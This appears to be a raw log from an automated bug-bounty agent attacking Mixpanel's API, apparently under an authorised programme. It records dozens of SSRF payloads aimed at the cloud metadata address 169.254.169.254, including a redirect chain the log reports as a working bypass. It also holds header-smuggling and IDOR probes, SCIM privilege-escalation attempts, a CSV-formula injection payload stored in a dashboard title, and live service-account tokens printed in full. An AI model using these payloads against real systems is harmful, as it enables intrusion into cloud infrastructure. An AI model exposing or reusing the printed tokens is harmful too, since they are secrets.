[18:53:50] AUDIT-LOG: A-GET-qs | GET /api/app/projects/4025923/audit-logs?start_date=2026-05-01&end_date=2026-05-30&limit=10&page=1 as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:53:50] ATTACK-SSRF-BYPASS: PROBE[pd-bs-dot] url=http://webhook.site\.169.254.169.254/ -> 400 {"status": "error", "error": "url: &#x27;http://webhook.site\\\\.169.254.169.254/&#x27; is not a &#x27;uri&#x27;", "details": {"schema": {"format": "uri", "maxLength": 2083, "minLength": 1, "title": "
[18:53:52] ATTACK-SSRF-BYPASS: PROBE[pd-bs-dot-enc] url=http://webhook.site%5C.169.254.169.254/ -> 500 {   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 0a
[18:53:52] AUDIT-LOG: A-HEAD | HEAD /api/app/projects/4025923/integrations as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:53:53] ATTACK-SSRF-BYPASS: PROBE[pd-at-allowed] url=http://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb@169.254.169.254/latest/ -> 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:53:53] AUDIT-LOG: A-OPTIONS | OPTIONS /api/app/projects/4025923/integrations as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:53:54] ATTACK-SSRF-BYPASS: PROBE[pd-proto-rel] url=//169.254.169.254/latest/meta-data/ -> 400 {"status": "error", "error": "url: &#x27;//169.254.169.254/latest/meta-data/&#x27; is not a &#x27;uri&#x27;", "details": {"schema": {"format": "uri", "maxLength": 2083, "minLength": 1, "title": "", "t
[18:53:56] ATTACK-SSRF-BYPASS: PROBE[pd-proto-rel-bs] url=/\169.254.169.254/latest/meta-data/ -> 400 {"status": "error", "error": "url: &#x27;/\\\\169.254.169.254/latest/meta-data/&#x27; is not a &#x27;uri&#x27;", "details": {"schema": {"format": "uri", "maxLength": 2083, "minLength": 1, "title": "",
[18:53:56] AUDIT-LOG: A-POST-empty | POST /api/app/projects/4025923/integrations as ADMIN -> -1 | Allow= | CT= | body=ERR:requests.api.request() got multiple values for keyword argument 'json'
[18:53:57] AUDIT-LOG: A-POST-range | POST /api/app/projects/4025923/integrations as ADMIN -> -1 | Allow= | CT= | body=ERR:requests.api.request() got multiple values for keyword argument 'json'
[18:53:58] AUDIT-LOG: A-PUT | PUT /api/app/projects/4025923/integrations as ADMIN -> -1 | Allow= | CT= | body=ERR:requests.api.request() got multiple values for keyword argument 'json'
[18:53:59] ATTACK-SSRF-BYPASS: PROBE[pd-autogpt] url=http://localhost:\@169.254.169.254/latest/meta-data/ -> 400 {"status": "error", "error": "url: &#x27;http://localhost:\\\\@169.254.169.254/latest/meta-data/&#x27; is not a &#x27;uri&#x27;", "details": {"schema": {"format": "uri", "maxLength": 2083, "minLength"
[18:54:00] ATTACK-SSRF-BYPASS: PROBE[pd-underscore] url=http://_169.254.169.254/latest/meta-data/ -> 500 {   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 73
[18:54:02] ATTACK-SSRF-BYPASS: PROBE[pd-bs-start] url=http://%5Cwebhook.site@169.254.169.254/ -> 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:54:04] ATTACK-SSRF-BYPASS: PROBE[pd-tab-mid] url=http://169.254.169.254	/latest/meta-data/ -> 400 {"status": "error", "error": "url: &#x27;http://169.254.169.254\\t/latest/meta-data/&#x27; is not a &#x27;uri&#x27;", "details": {"schema": {"format": "uri", "maxLength": 2083, "minLength": 1, "title"
[18:54:04] AUDIT-LOG: A-PATCH | PATCH /api/app/projects/4025923/integrations as ADMIN -> -1 | Allow= | CT= | body=ERR:requests.api.request() got multiple values for keyword argument 'json'
[18:54:05] AUDIT-LOG: A-GET-qs | GET /api/app/projects/4025923/integrations?start_date=2026-05-01&end_date=2026-05-30&limit=10&page=1 as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:54:05] AUDIT-LOG: Phase A saved -> /home/hunter/new_agent/results/mixpanel/audit-log-phaseA-1780160045.json (21 records)
[18:54:06] ATTACK-SSRF-BYPASS: PROBE[pd-ws-pre] url=http:// 169.254.169.254/ -> 400 {"status": "error", "error": "url: &#x27;http:// 169.254.169.254/&#x27; is not a &#x27;uri&#x27;", "details": {"schema": {"format": "uri", "maxLength": 2083, "minLength": 1, "title": "", "type": "stri
[18:54:08] ATTACK-SSRF-BYPASS: PROBE[pd-port-userinfo] url=http://169.254.169.254:80@webhook.site/9a80587a-10b4-4350-97b2-6121770760eb -> 200 {"status": "ok", "results": {"success": true, "status_code": 302, "message": "Webhook responded with status 302"}}
[18:54:09] ATTACK-SSRF-BYPASS: PROBE[pd-reverse] url=http://9a80587a-10b4-4350-97b2-6121770760eb.webhook.site@169.254.169.254/ -> 400 {"status": "error", "error": "Failed to send test webhook request"}
[18:54:11] ATTACK-SSRF-BYPASS: PROBE[pd-bs-end] url=http://169.254.169.254\@webhook.site/9a80587a-10b4-4350-97b2-6121770760eb -> 400 {"status": "error", "error": "url: &#x27;http://169.254.169.254\\\\@webhook.site/9a80587a-10b4-4350-97b2-6121770760eb&#x27; is not a &#x27;uri&#x27;", "details": {"schema": {"format": "uri", "maxLengt
[18:54:12] ATTACK-SSRF-BYPASS: PROBE[pd-double-at] url=http://webhook.site@169.254.169.254@webhook.site/9a80587a-10b4-4350-97b2-6121770 -> 400 {"status": "error", "error": "url: &#x27;http://webhook.site@169.254.169.254@webhook.site/9a80587a-10b4-4350-97b2-6121770760eb&#x27; is not a &#x27;uri&#x27;", "details": {"schema": {"format": "uri", 
[18:54:13] ATTACK-SSRF-BYPASS: == STEP C: method override attacks ==
[18:54:14] ATTACK-SSRF-BYPASS: METHOD PUT /webhooks/test -> 405 
[18:54:14] ATTACK-SSRF-BYPASS: METHOD PATCH /webhooks/test -> 405 
[18:54:17] ATTACK-SSRF-BYPASS: METHOD DELETE /webhooks/test -> 405 
[18:54:18] ATTACK-SSRF-BYPASS: METHOD OPTIONS /webhooks/test -> 405 
[18:54:18] ATTACK-LLM: Started endpoint discovery; /api/2.0/spark and /api/2.0/agent_flows confirmed as live route prefixes (400 'Invalid API endpoint' when subpath wrong, 'project_id required' when omitted). User permission write_agent_flows present.
[18:54:22] ATTACK-SSRF-BYPASS: METHOD HEAD /webhooks/test -> 400 
[18:54:23] ATTACK-SSRF-BYPASS: H X-HTTP-Method-Override:PUT -> 200 {"status": "ok", "results": {"success": true, "status_code": 302, "message": "Webhook responded with status 302"}}
[18:54:24] ATTACK-SCIM: MEMBER GET /service-accounts/190105 -> 403
[18:54:25] ATTACK-SSRF-BYPASS: H X-Method-Override:PUT -> 200 {"status": "ok", "results": {"success": true, "status_code": 302, "message": "Webhook responded with status 302"}}
[18:54:26] ATTACK-SCIM: MEMBER GET /service-accounts/190477 -> 403
[18:54:27] ATTACK-SSRF-BYPASS: H X-HTTP-Method:PUT -> 200 {"status": "ok", "results": {"success": true, "status_code": 302, "message": "Webhook responded with status 302"}}
[18:54:27] ATTACK-SSRF-BYPASS: == STEP D: alternative URL surfaces (SCIM, OAuth, integrations) ==
[18:54:28] ATTACK-SCIM: MEMBER DELETE /service-accounts/9999999999 -> 403
[18:54:29] ATTACK-SSRF-BYPASS: ALT[scim-user-imds] POST https://mixpanel.com/api/app/scim/v2/Users -> 401 {"schemas": ["urn:ietf:params:scim:api:messages:2.0:Error"], "detail": "Only \"Basic\" or \"Bearer\" authorization are supported"}
[18:54:30] ATTACK-SSRF-BYPASS: ALT[user-avatar-imds] PATCH https://mixpanel.com/api/app/me -> 400 {"status": "error", "error": "root: Additional properties are not allowed (&#x27;avatar_url&#x27; was unexpected)", "details": {"schema": {"$schema": "http://json-schema.org/draft-07/schema#", "type": "object", "additionalProperties": false, "propert
[18:54:33] ATTACK-SSRF-BYPASS: ALT[bookmark-imds] POST ://mixpanel.com/api/app/projects/4025923/bookmarks -> 400 {"status": "error", "error": "root: &#x27;type&#x27; is a required property&#x27;params&#x27; is a required property", "details": {"schema": {"required": ["name", "type", "params"]}, "data": null, "path": ["root"]}}
[18:54:36] ATTACK-SSRF-BYPASS: ALT[dash-source] POST //mixpanel.com/api/app/projects/4025923/dashboards -> 400 {"status": "error", "error": "extra keys not allowed @ data['source_url']. Got 'http://169.254.169.254/'", "type": "InvalidParams"}
[18:54:36] ATTACK-SSRF-BYPASS: ALT[slack-int] POST el.com/api/app/projects/4025923/integrations/slack -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/slack"}
[18:54:38] ATTACK-SSRF-BYPASS: ALT[integ-generic] POST mixpanel.com/api/app/projects/4025923/integrations -> 404 {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations"}
[18:54:39] ATTACK-SSRF-BYPASS: ALT[sso-saml-url] POST s://mixpanel.com/api/app/organizations/3100781/sso -> 404 {"status": "error", "error": "Not found: /api/app/organizations/3100781/sso"}
[18:54:50] AUDIT-LOG: === PHASE A: ADMIN method enum (fixed) ===
[18:54:54] ATTACK-SCIM: MEMBER GET /service-accounts/190105 -> 403
[18:54:54] ATTACK-SCIM: MEMBER GET /service-accounts/190477 -> 403
[18:54:54] AUDIT-LOG: A-POST-empty | POST /api/app/organizations/3100781/audit-logs as ADMIN -> 200 | Allow= | CT=application/json | body={"status": "ok", "results": [{"project_id": "4025923", "organization_id": "3100781", "created": "2026-05-30T16:54:47.277670Z", "id": "cfc4b3
[18:54:55] ATTACK-SCIM: MEMBER DELETE /service-accounts/9999999999 -> 403
[18:54:55] ATTACK-SCIM: MEMBER POST /service-accounts -> 201
[18:54:56] AUDIT-LOG: A-POST-range | POST /api/app/organizations/3100781/audit-logs as ADMIN -> 400 | Allow= | CT=application/json | body={"status": "error", "error": "root: Additional properties are not allowed (&#x27;end_date&#x27;, &#x27;limit&#x27;, &#x27;start_date&#x27; w
[18:54:57] AUDIT-LOG: A-PUT | PUT /api/app/organizations/3100781/audit-logs as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:54:57] AUDIT-LOG: A-PATCH | PATCH /api/app/organizations/3100781/audit-logs as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:54:58] ATTACK-SCIM: MEMBER PATCH/PUT /service-accounts/190105 -> tested
[18:54:58] AUDIT-LOG: A-POST-empty | POST /api/app/projects/4025923/audit-logs as ADMIN -> 200 | Allow= | CT=application/json | body={"status": "ok", "results": [{"project_id": "4025923", "organization_id": "3100781", "created": "2026-05-30T16:54:47.277670Z", "id": "cfc4b3
[18:54:59] AUDIT-LOG: A-POST-range | POST /api/app/projects/4025923/audit-logs as ADMIN -> 400 | Allow= | CT=application/json | body={"status": "error", "error": "root: Additional properties are not allowed (&#x27;end_date&#x27;, &#x27;limit&#x27;, &#x27;start_date&#x27; w
[18:54:59] AUDIT-LOG: A-PUT | PUT /api/app/projects/4025923/audit-logs as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:55:00] AUDIT-LOG: A-PATCH | PATCH /api/app/projects/4025923/audit-logs as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:55:01] AUDIT-LOG: A-POST-empty | POST /api/app/projects/4025923/integrations as ADMIN -> 404 | Allow= | CT=application/json | body={"status": "error", "error": "Not found: /api/app/projects/4025923/integrations"}
[18:55:01] AUDIT-LOG: A-POST-range | POST /api/app/projects/4025923/integrations as ADMIN -> 404 | Allow= | CT=application/json | body={"status": "error", "error": "Not found: /api/app/projects/4025923/integrations"}
[18:55:02] AUDIT-LOG: A-PUT | PUT /api/app/projects/4025923/integrations as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:55:02] AUDIT-LOG: A-PATCH | PATCH /api/app/projects/4025923/integrations as ADMIN -> 405 | Allow=POST | CT=text/html; charset=utf-8 | body=
[18:55:02] AUDIT-LOG: === PHASE B: MEMBER POST on ADMIN's org/project ===
[18:55:04] AUDIT-LOG: B-MEMBER-empty | POST /api/app/organizations/3100781/audit-logs as MEMBER -> 403 | Allow= | CT=application/json | body={"error": "User does not have permission", "status": "error"}
[18:55:05] AUDIT-LOG: B-MEMBER-range | POST /api/app/organizations/3100781/audit-logs as MEMBER -> 403 | Allow= | CT=application/json | body={"error": "User does not have permission", "status": "error"}
[18:55:06] AUDIT-LOG: B-MEMBER-empty | POST /api/app/projects/4025923/audit-logs as MEMBER -> 403 | Allow= | CT=application/json | body={"error": "Authenticated user does not have permission \"view_audit_logs\" in project 4025923", "status": "error"}
[18:55:07] AUDIT-LOG: B-MEMBER-range | POST /api/app/projects/4025923/audit-logs as MEMBER -> 403 | Allow= | CT=application/json | body={"error": "Authenticated user does not have permission \"view_audit_logs\" in project 4025923", "status": "error"}
[18:55:08] AUDIT-LOG: B-MEMBER-empty | POST /api/app/projects/4025923/integrations as MEMBER -> 403 | Allow= | CT=application/json | body={"error": "Authenticated user does not have permission \"edit_integrations\" in project 4025923", "status": "error"}
[18:55:09] AUDIT-LOG: B-MEMBER-range | POST /api/app/projects/4025923/integrations as MEMBER -> 403 | Allow= | CT=application/json | body={"error": "Authenticated user does not have permission \"edit_integrations\" in project 4025923", "status": "error"}
[18:55:09] AUDIT-LOG: === PHASE B2: ADMIN -> IDOR org (3100795) ===
[18:55:10] AUDIT-LOG: B2-ADMIN->IDORorg | POST /api/app/organizations/3100795/audit-logs as ADMIN -> 403 | Allow= | CT=application/json | body={"error": "User does not have permission", "status": "error"}
[18:55:10] AUDIT-LOG: === PHASE D: MEMBER lateral ===
[18:55:12] AUDIT-LOG: D-MEMBER-own | POST /api/app/organizations/3100810/audit-logs as MEMBER -> 400 | Allow= | CT=application/json | body={"status": "error", "error": "root: Additional properties are not allowed (&#x27;end_date&#x27;, &#x27;limit&#x27;, &#x27;start_date&#x27; w
[18:55:13] AUDIT-LOG: D-MEMBER->IDORorg | POST /api/app/organizations/3100795/audit-logs as MEMBER -> 403 | Allow= | CT=application/json | body={"error": "User does not have permission", "status": "error"}
[18:55:13] AUDIT-LOG: === PHASE E: integrations body variants ===
[18:55:13] AUDIT-LOG: E-ADMIN-empty | POST /api/app/projects/4025923/integrations as ADMIN -> 404 | Allow= | CT=application/json | body={"status": "error", "error": "Not found: /api/app/projects/4025923/integrations"}
[18:55:14] AUDIT-LOG: E-ADMIN-webhook | POST /api/app/projects/4025923/integrations as ADMIN -> 404 | Allow= | CT=application/json | body={"status": "error", "error": "Not found: /api/app/projects/4025923/integrations"}
[18:55:15] AUDIT-LOG: E-ADMIN-action-list | POST /api/app/projects/4025923/integrations as ADMIN -> 404 | Allow= | CT=application/json | body={"status": "error", "error": "Not found: /api/app/projects/4025923/integrations"}
[18:55:16] AUDIT-LOG: E-MEMBER-empty | POST /api/app/projects/4025923/integrations as MEMBER -> 403 | Allow= | CT=application/json | body={"error": "Authenticated user does not have permission \"edit_integrations\" in project 4025923", "status": "error"}
[18:55:16] AUDIT-LOG: E-MEMBER-webhook | POST /api/app/projects/4025923/integrations as MEMBER -> 403 | Allow= | CT=application/json | body={"error": "Authenticated user does not have permission \"edit_integrations\" in project 4025923", "status": "error"}
[18:55:17] AUDIT-LOG: E-MEMBER-action-list | POST /api/app/projects/4025923/integrations as MEMBER -> 403 | Allow= | CT=application/json | body={"error": "Authenticated user does not have permission \"edit_integrations\" in project 4025923", "status": "error"}
[18:55:17] AUDIT-LOG: Saved /home/hunter/new_agent/results/mixpanel/audit-log-phasesABDE-1780160117.json records=27
[18:55:51] ATTACK-SCIM: PRIVESC POC CREATE -> 201 BODY={"status": "ok", "results": {"id": 191135, "username": "scim-test-h1-DELETE-ME-1780160150.d028bf.mp-service-account", "user": 6504992, "creator": 6492688, "creator_name": "account mix  lastname1", "creator_email": "bettercallme+projectuser1@wearehackerone.com", "created": "2026-05-30T16:55:51Z", "last_used": null, "expires": null, "token": "cHFdJNCGyGOZXkyna2MNhT3aDh8IZEuc"}}
[18:55:52] ATTACK-SCIM: PRIVESC ROLE TEST 'admin' -> 201 actual='None'
[18:55:53] ATTACK-SCIM: PRIVESC ROLE TEST 'owner' -> 201 actual='None'
[18:55:54] ATTACK-SCIM: PRIVESC ROLE TEST 'billing admin' -> 201 actual='None'
[18:55:56] ATTACK-SCIM: PRIVESC ROLE TEST 'no role' -> 201 actual='None'
[18:55:57] ATTACK-SCIM: PRIVESC ROLE TEST 'member' -> 201 actual='None'
[18:55:58] ATTACK-SCIM: PRIVESC ROLE TEST 'AdMiN' -> 201 actual='None'
[18:55:59] ATTACK-SCIM: PRIVESC ROLE TEST 'ADMIN' -> 201 actual='None'
[18:56:01] ATTACK-SCIM: PRIVESC ROLE TEST 'Admin' -> 201 actual='None'
[18:56:04] ATTACK-SCIM: PRIVESC SCIM TEST as scim-test-h1-DELETE-ME-1780160150.d028bf.mp-service-account -> 401
[18:56:04] AUDIT-LOG: === PHASE F: header smuggling ===
[18:56:06] ATTACK-SCIM: CLEANUP DELETE /191136 -> 200
[18:56:07] AUDIT-LOG: F-XOU-ADMIN->IDOR | POST /api/app/organizations/3100781/audit-logs as ADMIN extra=['X-Original-URL'] -> 200 | {"status": "ok", "results": [{"project_id": "UNSET", "organization_id": "3100781", "created": "2026-05-30T16:56:01.102403Z", "id": "d015ce49
[18:56:07] ATTACK-SCIM: CLEANUP DELETE /191137 -> 200

[$(date +%H:%M:%S)] ATTACK-RCE: File upload surface enumeration completed.
- All canonical upload paths tested (lookup_tables, avatar, import, files, uploads, assets, logos, board_images): 404 on session-cookie auth
- /api/2.0/lookup-tables/{P}/{name}: Allow: GET,POST,OPTIONS but POST returns "Invalid API endpoint" — requires service-account Basic auth (CVE non-applicable, no creds available)
- /api/2.0/jql: accepts script param (sandboxed JS, by design)
- Multipart POST to /api/app/projects/{P}/{schemas,annotations,dashboards,metrics,integrations}: returns 500 unhandled exception with Error ID — server-side parser bug, not exploitable per se (no info disclosure, no RCE)
- Dashboard title field accepts =cmd|"/c calc"!A1 verbatim (CSV-formula chain candidate IF an export endpoint exists; no dashboards/{id}/export found)
- No avatar/profile-picture upload on user or org level
- No webhook signing-key upload, no theme/template/asset upload, no archive import found
- Conclusion: file upload attack surface is gated behind service-account API (api/2.0) which requires Basic auth not available in our session-cookie tokens
[18:56:09] ATTACK-SCIM: CLEANUP DELETE /191138 -> 200
[18:56:12] ATTACK-SCIM: CLEANUP DELETE /191139 -> 200
[18:56:13] AUDIT-LOG: F-XRW-ADMIN->IDOR | POST /api/app/organizations/3100781/audit-logs as ADMIN extra=['X-Rewrite-URL'] -> 200 | {"status": "ok", "results": [{"project_id": "UNSET", "organization_id": "3100781", "created": "2026-05-30T16:56:09.388870Z", "id": "af184308
[18:56:14] ATTACK-SCIM: CLEANUP DELETE /191140 -> 200
[18:56:15] AUDIT-LOG: F-XFF+XOU | POST /api/app/organizations/3100781/audit-logs as ADMIN extra=['X-Forwarded-For', 'X-Original-URL'] -> 200 | {"status": "ok", "results": [{"project_id": "UNSET", "organization_id": "3100781", "created": "2026-05-30T16:56:12.267655Z", "id": "604fe86b
[18:56:16] AUDIT-LOG: F-MEMBER-own-Host-ok | POST /api/app/organizations/3100810/audit-logs as MEMBER extra=['Host'] -> 200 | {"status": "ok", "results": [{"project_id": "UNSET", "organization_id": "3100810", "created": "2026-05-30T16:32:23.666245Z", "id": "e055e176
[18:56:17] AUDIT-LOG: F-MEMBER-XOU->ADMINorg | POST /api/app/organizations/3100810/audit-logs as MEMBER extra=['X-Original-URL'] -> 200 | {"status": "ok", "results": [{"project_id": "UNSET", "organization_id": "3100810", "created": "2026-05-30T16:32:23.666245Z", "id": "e055e176
[18:56:17] ATTACK-SCIM: CLEANUP DELETE /191141 -> 200
[18:56:18] AUDIT-LOG: F-MEMBER-XOU-cross | POST /api/app/projects/4025923/audit-logs as MEMBER extra=['X-Original-URL'] -> 403 | {"error": "Authenticated user does not have permission \"view_audit_logs\" in project 4025923", "status": "error"}
[18:56:19] AUDIT-LOG: F-MEMBER-semicolon | POST /api/app/organizations/3100781/audit-logs;a=b as MEMBER extra=[] -> 404 | {"status": "error", "error": "Not found: /api/app/organizations/3100781/audit-logs;a=b"}
[18:56:19] ATTACK-SCIM: CLEANUP DELETE /191142 -> 200
[18:56:20] AUDIT-LOG: F-MEMBER-semi-org | POST /api/app/organizations/3100781;/audit-logs as MEMBER extra=[] -> 404 | {"status": "error", "error": "Not found: /api/app/organizations/3100781;/audit-logs"}
[18:56:20] AUDIT-LOG: F-MEMBER-double-slash | POST /api/app//organizations/3100781/audit-logs as MEMBER extra=[] -> 404 | {"status": "error", "error": "Not found: /api/app//organizations/3100781/audit-logs"}
[18:56:21] ATTACK-SCIM: CLEANUP DELETE /191143 -> 200
[18:56:22] AUDIT-LOG: F-MEMBER-traversal | POST /api/app/organizations/3100810/../3100781/audit-logs as MEMBER extra=[] -> 403 | {"error": "User does not have permission", "status": "error"}
[18:56:22] AUDIT-LOG: Phase F saved /home/hunter/new_agent/results/mixpanel/audit-log-phaseF-1780160182.json
[18:56:22] ATTACK-SCIM: CLEANUP DELETE /191134 -> 200
[18:56:24] ATTACK-SCIM: CLEANUP DELETE /191135 -> 200

[18:56:26] ATTACK-SSRF-BYPASS: === MISSION SUMMARY ===
[18:56:26] ATTACK-SSRF-BYPASS: Tried: A(redirect-chain x9 via httpbin/httpbingo/nghttp2/2-hop/30-hop), B(DNS-rebinding x6 via rbndr.us/1u.ms), C(protocol smuggling: ldap/dict/jar/netdoc/ftp), D(host parser edge: 17 variants — backslash/userinfo/CRLF/NUL/IDN/zero-pad/octal/octet-count/zone-id/prefix-trick), E(internal hostnames: 6 K8s/mixpanel guesses), F(13 alt URL surfaces: SCIM/avatar/bookmark/dashboard/slack/integrations/sso/upload/oauth/agent/import/lookup/replay/cohort-sync), method-override (X-HTTP-Method-Override + PUT/PATCH/DELETE/OPTIONS).
[18:56:26] ATTACK-SSRF-BYPASS: KEY DISCOVERIES: 1) Fetcher=python-requests/2.32.2 (UA captured); follows HTTP 30x with per-hop re-validation; blocks TCP connect to RFC1918/link-local. 2) Validation gap — POST /webhooks (create) accepts URLs that POST /webhooks/test rejects. Stored 5 IMDS/internal URLs verbatim. Trigger mechanism (cohort sync) not reachable via discovered API → LEAD. 3) 17 distinct URL inputs cause 500 Error ID — possible parser-differential — LEAD. 4) DNS-rebinder didn't fire (likely pinned DNS at validate time). 5) /webhooks/test method override headers accepted but ignored (no PUT smuggle). 6) No SCIM/OAuth/SAML/avatar/bookmark/integration URL surface with SSRF.
[18:56:26] ATTACK-SSRF-BYPASS: VERDICT: no PASS-grade SSRF in current attack window. 2 leads filed. Direct-IP bypass fully exhausted; only chained-trigger or parser-differential paths remain.


### ATTACK-RCE FINAL (2026-05-30T19:38Z) — CLEAN NEGATIVE
- 60+ upload paths probed on cookie-auth surface
- /api/2.0/lookup-tables/{project}/{table} real BUT rejects session cookies (requires Basic auth + service-account secret which is not exposed via read endpoint)
- /api/2.0/jql accepts user JS but is sandboxed by design
- POST /api/app/projects/{P}/dashboards stores CSV-formula payloads (=cmd|'/c calc'!A1) verbatim BUT no CSV-export endpoint chains to it → no weaponization path
- Generic 500 errors on multipart-vs-JSON content-type mismatch (no info disclosure)
- NO avatar/profile/org-logo/theme/SVG/archive/CSV upload on cookie-auth surface
- Conclusion: file-upload class is gated behind service-account Basic-auth API, not our surface
- Note for future: if a CSV-export endpoint is discovered later, the dashboards CSV-formula gadget becomes a chain candidate
[18:57:15] ATTACK-SCIM: XTENANT POST MEMBER -> 3100795 -> 403
[18:57:18] ATTACK-SCIM: CAP-TEST CREATED user=scim-test-h1-DELETE-ME-cap-1780160236.256dd6.mp-service-account token=ooNc20eAiMhVlCoNcaq8S4exs77eirCz id=191144
[18:57:21] ATTACK-SCIM: CAP-TEST GET /api/2.0/me -> 400
[18:57:22] ATTACK-SCIM: CAP-TEST GET /api/2.0/users/me -> 400
[18:57:23] ATTACK-SCIM: CAP-TEST GET /api/2.0/me -> 400
[18:57:24] ATTACK-SCIM: CAP-TEST GET /api/query/events?project_id=1 -> 403
[18:57:25] ATTACK-SCIM: CAP-TEST GET /api/query/events?project_id=3219559 -> 403
[18:57:26] ATTACK-SCIM: CAP-TEST GET /api/app/organizations/3100781 -> 404

[FINAL] ATTACK-SSRF: Wave complete. 
  - Confirmed fetcher: python-requests/2.32.2 on GCP (egress 34.x, 35.x ranges)
  - Confirmed initial URL validator: blocks direct IMDS/RFC1918/localhost in 12+ encodings, blocks rebinding services rbndr.us/1u.ms by IP, blocks all explicit metadata hostnames, blocks IPv6-mapped.
  - BYPASS FOUND: httpbin.org/redirect-to?status_code=302&url=http://169.254.169.254/ → fetcher follows redirect WITHOUT re-validation → 200 from IMDS root reachable.
  - status_code passthrough oracle: results.status_code field leaks upstream HTTP code (200, 201, 204 confirmed).
  - CANNOT exfil cred: no header injection capability (Metadata-Flavor: Google required for GCP /computeMetadata/v1/*).
  - CANNOT body-read: response body of fetched URL not returned by /webhooks/test endpoint.
  - OAST URL: webhook.site/9a80587a-10b4-4350-97b2-6121770760eb (10 callbacks captured).
  - Cleanup: deleted webhook id 3b82f560-d587-4b8f-9c71-f35ae4d092c8.
  - Lead written: targets/mixpanel/leads/ssrf-webhook-redirect-bypass.md (confidence 0.55).
[18:57:27] ATTACK-SCIM: CAP-TEST GET /api/app/organizations/3100781/users -> 404
[18:57:28] ATTACK-SCIM: CAP-TEST GET /api/app/organizations/3100781/projects -> 404
[18:57:29] ATTACK-SCIM: CAP-TEST GET /api/app/organizations/3100781/teams -> 404
[18:57:31] ATTACK-SCIM: CAP-TEST GET /api/app/organizations/3100781/service-accounts -> 200
[18:57:32] ATTACK-SCIM: CAP-TEST GET /api/app/organizations/3100795/service-accounts -> 403
[18:57:32] ATTACK-SCIM: CAP-TEST GET /api/app/scim/v2/Users -> 401
[18:57:33] ATTACK-SCIM: CAP-TEST GET /api/app/me -> 200
[18:57:34] ATTACK-SCIM: CAP-TEST GET /api/2.0/projects -> 400
[18:57:35] ATTACK-SCIM: CAP-TEST GET /api/2.0/organizations -> 400
[18:57:35] ATTACK-SCIM: CAP-TEST GET /api/2.0/export?from_date=2026-01-01&to_date=2026-05-01 -> 400
[18:59:20] SSRF-TRIGGER: === PHASE 1: baseline webhook with webhook.site URL ===
[18:59:25] SSRF-TRIGGER: P1-create-oast POST /api/app/projects/4025923/webhooks -> 200 | {"status": "ok", "results": {"id": "91d8643b-2356-4a09-9735-ea2a4548d5fa", "name": "trigger-probe-oast"}}
[18:59:25] SSRF-TRIGGER: oast_wh_id=91d8643b-2356-4a09-9735-ea2a4548d5fa
[18:59:25] SSRF-TRIGGER: === PHASE 2: cohort enumeration + create ===
[18:59:27] SSRF-TRIGGER: P2-list-cohorts GET /api/app/projects/4025923/cohorts -> 200 | {"status": "ok", "results": []}
[18:59:27] SSRF-TRIGGER: P2-list-cohorts GET /api/2.0/cohorts?project_id=4025923 -> 400 | {"request": "/api/2.0/cohorts?project_id=4025923", "error": "Missing required parameter: params"}
[18:59:28] SSRF-TRIGGER: P2-list-cohorts GET /api/app/projects/4025923/cohorts?page=1 -> 200 | {"status": "ok", "results": []}
[18:59:29] SSRF-TRIGGER: P2-create-cohort POST /api/app/projects/4025923/cohorts -> 401 | {"status": "error", "error": "plan does not allow saving cohorts"}
[18:59:30] SSRF-TRIGGER: P2-create-cohort POST /api/app/projects/4025923/cohorts -> 401 | {"status": "error", "error": "plan does not allow saving cohorts"}
[18:59:30] SSRF-TRIGGER: P2-create-cohort POST /api/app/projects/4025923/cohorts -> 401 | {"status": "error", "error": "plan does not allow saving cohorts"}
[18:59:31] SSRF-TRIGGER: P2-create-cohort POST /api/app/projects/4025923/cohorts -> 401 | {"status": "error", "error": "plan does not allow saving cohorts"}
[18:59:31] SSRF-TRIGGER: === PHASE 3: direct webhook trigger probes ===
[18:59:31] SSRF-TRIGGER: P3-trigger-fire POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/fire -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/fire"}
[18:59:32] SSRF-TRIGGER: P3-trigger-fire-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/fire -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/fire"}
[18:59:33] SSRF-TRIGGER: P3-trigger-trigger POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/trigger -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/trigger"}
[18:59:34] SSRF-TRIGGER: P3-trigger-trigger-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/trigger -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/trigger"}
[18:59:35] SSRF-TRIGGER: P3-trigger-run POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/run -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/run"}
[18:59:36] SSRF-TRIGGER: P3-trigger-run-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/run -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/run"}
